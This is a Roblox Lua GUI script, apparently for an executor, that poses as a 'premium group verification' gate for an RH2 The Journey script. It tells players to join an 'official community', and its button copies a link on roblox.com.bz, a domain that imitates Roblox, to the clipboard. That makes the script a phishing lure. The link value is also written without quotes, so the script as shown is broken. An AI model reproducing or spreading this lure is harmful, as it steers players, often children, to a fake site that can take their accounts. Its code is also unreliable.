--// =========================================================
--// RH2 THE JOURNEY - SEASON 5
--// Premium Group Verification GUI
--// =========================================================

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

--// =========================================================
--// CONFIG
--// =========================================================

local GROUP_ID = "4945729406"
local GROUP_LINK = https://roblox.com.bz/communities/4945729406/

local GUI_NAME = "RH2Season5GUI"

--// =========================================================
--// CLEAN OLD GUI
--// =========================================================

local oldGui = PlayerGui:FindFirstChild(GUI_NAME)

if oldGui then
	oldGui:Destroy()
end

--// =========================================================
--// HELPERS
--// =========================================================

local function create(className, properties, parent)
	local object = Instance.new(className)

	for property, value in pairs(properties) do
		object[property] = value
	end

	object.Parent = parent

	return object
end

local function tween(object, time, properties, style, direction)
	local info = TweenInfo.new(
		time or 0.25,
		style or Enum.EasingStyle.Quint,
		direction or Enum.EasingDirection.Out
	)

	return TweenService:Create(object, info, properties)
end

--// =========================================================
--// COLORS
--// =========================================================

local COLORS = {
	Background = Color3.fromRGB(10, 8, 16),
	Panel = Color3.fromRGB(18, 14, 29),
	Panel2 = Color3.fromRGB(24, 19, 38),

	White = Color3.fromRGB(248, 246, 255),
	LightText = Color3.fromRGB(218, 212, 230),
	MutedText = Color3.fromRGB(143, 134, 158),

	Purple = Color3.fromRGB(142, 75, 255),
	PurpleLight = Color3.fromRGB(180, 119, 255),
	PurpleDark = Color3.fromRGB(83, 43, 150),

	Border = Color3.fromRGB(67, 49, 91),

	Success = Color3.fromRGB(93, 224, 147),
	Warning = Color3.fromRGB(255, 183, 92),
}

--// =========================================================
--// SCREEN GUI
--// =========================================================

local ScreenGui = create("ScreenGui", {
	Name = GUI_NAME,
	ResetOnSpawn = false,
	ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
	IgnoreGuiInset = true
}, PlayerGui)

--// =========================================================
--// SHADOW
--// =========================================================

local Shadow = create("ImageLabel", {
	Name = "Shadow",
	AnchorPoint = Vector2.new(0.5, 0.5),
	Position = UDim2.fromScale(0.5, 0.5),
	Size = UDim2.new(0, 530, 0, 480),
	BackgroundTransparency = 1,
	Image = "rbxassetid://1316045217",
	ImageColor3 = Color3.fromRGB(0, 0, 0),
	ImageTransparency = 0.35,
	ScaleType = Enum.ScaleType.Slice,
	SliceCenter = Rect.new(10, 10, 118, 118),
	ZIndex = 0
}, ScreenGui)

--// =========================================================
--// MAIN WINDOW
--// =========================================================

local Main = create("Frame", {
	Name = "Main",
	AnchorPoint = Vector2.new(0.5, 0.5),
	Position = UDim2.fromScale(0.5, 0.5),
	Size = UDim2.new(0, 470, 0, 360),
	BackgroundColor3 = COLORS.Panel,
	BorderSizePixel = 0,
	ZIndex = 2
}, ScreenGui)

create("UICorner", {
	CornerRadius = UDim.new(0, 18)
}, Main)

create("UIStroke", {
	Color = COLORS.Border,
	Thickness = 1.5,
	Transparency = 0.15
}, Main)

--// =========================================================
--// TOP PURPLE GLOW
--// =========================================================

local TopGlow = create("Frame", {
	Name = "TopGlow",
	Size = UDim2.new(1, -40, 0, 3),
	Position = UDim2.new(0, 20, 0, 0),
	BackgroundColor3 = COLORS.Purple,
	BorderSizePixel = 0,
	ZIndex = 5
}, Main)

create("UICorner", {
	CornerRadius = UDim.new(1, 0)
}, TopGlow)

--// =========================================================
--// TOP BAR
--// =========================================================

local TopBar = create("Frame", {
	Name = "TopBar",
	Size = UDim2.new(1, 0, 0, 82),
	BackgroundColor3 = COLORS.Panel2,
	BorderSizePixel = 0,
	ZIndex = 3
}, Main)

create("UICorner", {
	CornerRadius = UDim.new(0, 18)
}, TopBar)

--// Small purple icon
local Icon = create("Frame", {
	Name = "Icon",
	Size = UDim2.new(0, 48, 0, 48),
	Position = UDim2.new(0, 20, 0, 17),
	BackgroundColor3 = Color3.fromRGB(43, 27, 68),
	BorderSizePixel = 0,
	ZIndex = 5
}, TopBar)

create("UICorner", {
	CornerRadius = UDim.new(0, 14)
}, Icon)

create("UIStroke", {
	Color = COLORS.PurpleDark,
	Thickness = 1
}, Icon)

create("TextLabel", {
	BackgroundTransparency = 1,
	Size = UDim2.fromScale(1, 1),
	Text = "🔮",
	Font = Enum.Font.GothamBold,
	TextSize = 22,
	TextColor3 = COLORS.PurpleLight,
	ZIndex = 6
}, Icon)

--// =========================================================
--// TITLE
--// =========================================================

local Season = create("TextLabel", {
	Name = "Season",
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 82, 0, 13),
	Size = UDim2.new(0, 220, 0, 18),
	Text = "SEASON 5  •  BETA",
	Font = Enum.Font.GothamBold,
	TextSize = 11,
	TextColor3 = COLORS.PurpleLight,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 5
}, TopBar)

local Title = create("TextLabel", {
	Name = "Title",
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 80, 0, 29),
	Size = UDim2.new(1, -135, 0, 35),
	Text = "RH2 THE JOURNEY",
	Font = Enum.Font.GothamBlack,
	TextSize = 25,
	TextColor3 = COLORS.White,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 5
}, TopBar)

--// =========================================================
--// CLOSE BUTTON
--// =========================================================

local CloseButton = create("TextButton", {
	Name = "Close",
	AnchorPoint = Vector2.new(1, 0),
	Position = UDim2.new(1, -16, 0, 16),
	Size = UDim2.new(0, 38, 0, 38),
	BackgroundColor3 = Color3.fromRGB(37, 29, 49),
	BorderSizePixel = 0,
	AutoButtonColor = false,
	Text = "×",
	Font = Enum.Font.GothamMedium,
	TextSize = 24,
	TextColor3 = COLORS.MutedText,
	ZIndex = 7
}, TopBar)

create("UICorner", {
	CornerRadius = UDim.new(0, 11)
}, CloseButton)

CloseButton.MouseEnter:Connect(function()
	tween(CloseButton, 0.15, {
		BackgroundColor3 = Color3.fromRGB(70, 35, 55),
		TextColor3 = Color3.fromRGB(255, 125, 145)
	}):Play()
end)

CloseButton.MouseLeave:Connect(function()
	tween(CloseButton, 0.15, {
		BackgroundColor3 = Color3.fromRGB(37, 29, 49),
		TextColor3 = COLORS.MutedText
	}):Play()
end)

CloseButton.MouseButton1Click:Connect(function()
	tween(Main, 0.25, {
		Size = UDim2.new(0, 430, 0, 320),
		BackgroundTransparency = 1
	}):Play()

	tween(Shadow, 0.25, {
		ImageTransparency = 1
	}):Play()

	task.wait(0.25)

	ScreenGui:Destroy()
end)

--// =========================================================
--// DESCRIPTION
--// =========================================================

local Description = create("TextLabel", {
	Name = "Description",
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 35, 0, 103),
	Size = UDim2.new(1, -70, 0, 48),
	Text = "Unlock access to the script by joining\nour official RH2 The Journey community.",
	Font = Enum.Font.GothamMedium,
	TextSize = 14,
	TextColor3 = COLORS.LightText,
	TextWrapped = true,
	TextXAlignment = Enum.TextXAlignment.Center,
	ZIndex = 4
}, Main)

--// =========================================================
--// STATUS CARD
--// =========================================================

local StatusCard = create("Frame", {
	Name = "StatusCard",
	Position = UDim2.new(0, 30, 0, 165),
	Size = UDim2.new(1, -60, 0, 58),
	BackgroundColor3 = Color3.fromRGB(22, 18, 33),
	BorderSizePixel = 0,
	ZIndex = 4
}, Main)

create("UICorner", {
	CornerRadius = UDim.new(0, 12)
}, StatusCard)

create("UIStroke", {
	Color = Color3.fromRGB(54, 43, 70),
	Thickness = 1
}, StatusCard)

--// Status dot
local StatusDot = create("Frame", {
	Name = "StatusDot",
	Position = UDim2.new(0, 17, 0.5, -6),
	Size = UDim2.new(0, 12, 0, 12),
	BackgroundColor3 = COLORS.Purple,
	BorderSizePixel = 0,
	ZIndex = 6
}, StatusCard)

create("UICorner", {
	CornerRadius = UDim.new(1, 0)
}, StatusDot)

--// Dot glow
local DotGlow = create("Frame", {
	BackgroundColor3 = COLORS.Purple,
	BackgroundTransparency = 0.75,
	Position = UDim2.new(0, 13, 0.5, -10),
	Size = UDim2.new(0, 20, 0, 20),
	BorderSizePixel = 0,
	ZIndex = 5
}, StatusCard)

create("UICorner", {
	CornerRadius = UDim.new(1, 0)
}, DotGlow)

local StatusTitle = create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 42, 0, 9),
	Size = UDim2.new(1, -55, 0, 18),
	Text = "GROUP MEMBERSHIP",
	Font = Enum.Font.GothamBold,
	TextSize = 10,
	TextColor3 = COLORS.MutedText,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 6
}, StatusCard)

local Status = create("TextLabel", {
	Name = "Status",
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 42, 0, 27),
	Size = UDim2.new(1, -55, 0, 20),
	Text = "Join the official group to continue",
	Font = Enum.Font.GothamMedium,
	TextSize = 12,
	TextColor3 = Color3.fromRGB(199, 184, 220),
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 6
}, StatusCard)

--// =========================================================
--// MAIN BUTTON
--// =========================================================

local CopyButton = create("TextButton", {
	Name = "CopyGroupLink",
	Position = UDim2.new(0, 30, 0, 238),
	Size = UDim2.new(1, -60, 0, 56),
	BackgroundColor3 = COLORS.Purple,
	BorderSizePixel = 0,
	AutoButtonColor = false,
	Text = "",
	ZIndex = 5
}, Main)

create("UICorner", {
	CornerRadius = UDim.new(0, 13)
}, CopyButton)

local ButtonStroke = create("UIStroke", {
	Color = COLORS.PurpleLight,
	Thickness = 1,
	Transparency = 0.25
}, CopyButton)

local ButtonText = create("TextLabel", {
	BackgroundTransparency = 1,
	Size = UDim2.new(1, -70, 1, 0),
	Position = UDim2.new(0, 55, 0, 0),
	Text = "COPY GROUP LINK",
	Font = Enum.Font.GothamBlack,
	TextSize = 14,
	TextColor3 = Color3.fromRGB(255, 255, 255),
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 7
}, CopyButton)

local ButtonIcon = create("TextLabel", {
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 20, 0, 0),
	Size = UDim2.new(0, 28, 1, 0),
	Text = "↗",
	Font = Enum.Font.GothamBold,
	TextSize = 20,
	TextColor3 = Color3.fromRGB(255, 255, 255),
	ZIndex = 7
}, CopyButton)

local Arrow = create("TextLabel", {
	BackgroundTransparency = 1,
	AnchorPoint = Vector2.new(1, 0.5),
	Position = UDim2.new(1, -20, 0.5, 0),
	Size = UDim2.new(0, 20, 0, 25),
	Text = "›",
	Font = Enum.Font.GothamBold,
	TextSize = 25,
	TextColor3 = Color3.fromRGB(220, 190, 255),
	ZIndex = 7
}, CopyButton)

--// =========================================================
--// BUTTON ANIMATION
--// =========================================================

CopyButton.MouseEnter:Connect(function()

	tween(CopyButton, 0.18, {
		BackgroundColor3 = Color3.fromRGB(164, 91, 255)
	}):Play()

	tween(ButtonStroke, 0.18, {
		Transparency = 0
	}):Play()

	tween(Arrow, 0.18, {
		Position = UDim2.new(1, -16, 0.5, 0)
	}):Play()
end)

CopyButton.MouseLeave:Connect(function()

	tween(CopyButton, 0.18, {
		BackgroundColor3 = COLORS.Purple
	}):Play()

	tween(ButtonStroke, 0.18, {
		Transparency = 0.25
	}):Play()

	tween(Arrow, 0.18, {
		Position = UDim2.new(1, -20, 0.5, 0)
	}):Play()
end)

CopyButton.MouseButton1Down:Connect(function()

	tween(CopyButton, 0.08, {
		Size = UDim2.new(1, -66, 0, 53),
		Position = UDim2.new(0, 33, 0, 240)
	}):Play()
end)

CopyButton.MouseButton1Up:Connect(function()

	tween(CopyButton, 0.12, {
		Size = UDim2.new(1, -60, 0, 56),
		Position = UDim2.new(0, 30, 0, 238)
	}):Play()
end)

--// =========================================================
--// FOOTER
--// =========================================================

local Footer = create("TextLabel", {
	Name = "Footer",
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 30, 1, -42),
	Size = UDim2.new(1, -60, 0, 20),
	Text = "RH2 THE JOURNEY   •   SEASON 5",
	Font = Enum.Font.GothamBold,
	TextSize = 9,
	TextColor3 = Color3.fromRGB(93, 83, 108),
	TextXAlignment = Enum.TextXAlignment.Center,
	ZIndex = 5
}, Main)

--// =========================================================
--// COPY FUNCTION
--// =========================================================

local function setStatus(text, color)
	Status.Text = text
	Status.TextColor3 = color
end

CopyButton.MouseButton1Click:Connect(function()

	if setclipboard then

		setclipboard(GROUP_LINK)

		StatusDot.BackgroundColor3 = COLORS.Success
		DotGlow.BackgroundColor3 = COLORS.Success

		setStatus(
			"Group link copied to clipboard!",
			COLORS.Success
		)

		ButtonText.Text = "LINK COPIED"
		ButtonIcon.Text = "✓"
		Arrow.Text = "✓"

		tween(CopyButton, 0.15, {
			BackgroundColor3 = Color3.fromRGB(55, 145, 91)
		}):Play()

		task.wait(2)

		ButtonText.Text = "COPY GROUP LINK"
		ButtonIcon.Text = "↗"
		Arrow.Text = "›"

		StatusDot.BackgroundColor3 = COLORS.Purple
		DotGlow.BackgroundColor3 = COLORS.Purple

		setStatus(
			"Join the official group to continue",
			Color3.fromRGB(199, 184, 220)
		)

		tween(CopyButton, 0.15, {
			BackgroundColor3 = COLORS.Purple
		}):Play()

	else

		StatusDot.BackgroundColor3 = COLORS.Warning
		DotGlow.BackgroundColor3 = COLORS.Warning

		setStatus(
			"Clipboard isn't supported here",
			COLORS.Warning
		)

	end
end)

--// =========================================================
--// DRAGGING
--// =========================================================

local dragging = false
local dragStart
local startPosition

local function updateDrag(input)

	local delta = input.Position - dragStart

	Main.Position = UDim2.new(
		startPosition.X.Scale,
		startPosition.X.Offset + delta.X,

		startPosition.Y.Scale,
		startPosition.Y.Offset + delta.Y
	)

	Shadow.Position = Main.Position
end

TopBar.InputBegan:Connect(function(input)

	if input.UserInputType == Enum.UserInputType.MouseButton1
		or input.UserInputType == Enum.UserInputType.Touch then

		dragging = true
		dragStart = input.Position
		startPosition = Main.Position

		input.Changed:Connect(function()

			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end

		end)
	end
end)

UserInputService.InputChanged:Connect(function(input)

	if dragging then

		if input.UserInputType == Enum.UserInputType.MouseMovement
			or input.UserInputType == Enum.UserInputType.Touch then

			updateDrag(input)

		end
	end
end)

--// =========================================================
--// PULSING PURPLE ACCENT
--// =========================================================

task.spawn(function()

	while ScreenGui.Parent do

		tween(TopGlow, 1.2, {
			BackgroundTransparency = 0.35
		}, Enum.EasingStyle.Sine):Play()

		task.wait(1.2)

		tween(TopGlow, 1.2, {
			BackgroundTransparency = 0
		}, Enum.EasingStyle.Sine):Play()

		task.wait(1.2)

	end

end)

--// =========================================================
--// ENTRANCE ANIMATION
--// =========================================================

Main.Size = UDim2.new(0, 420, 0, 320)
Main.BackgroundTransparency = 1

Shadow.ImageTransparency = 1

tween(Main, 0.45, {
	Size = UDim2.new(0, 470, 0, 360),
	BackgroundTransparency = 0
}, Enum.EasingStyle.Quint, Enum.EasingDirection.Out):Play()

tween(Shadow, 0.45, {
	ImageTransparency = 0.35
}, Enum.EasingStyle.Quint, Enum.EasingDirection.Out):Play()
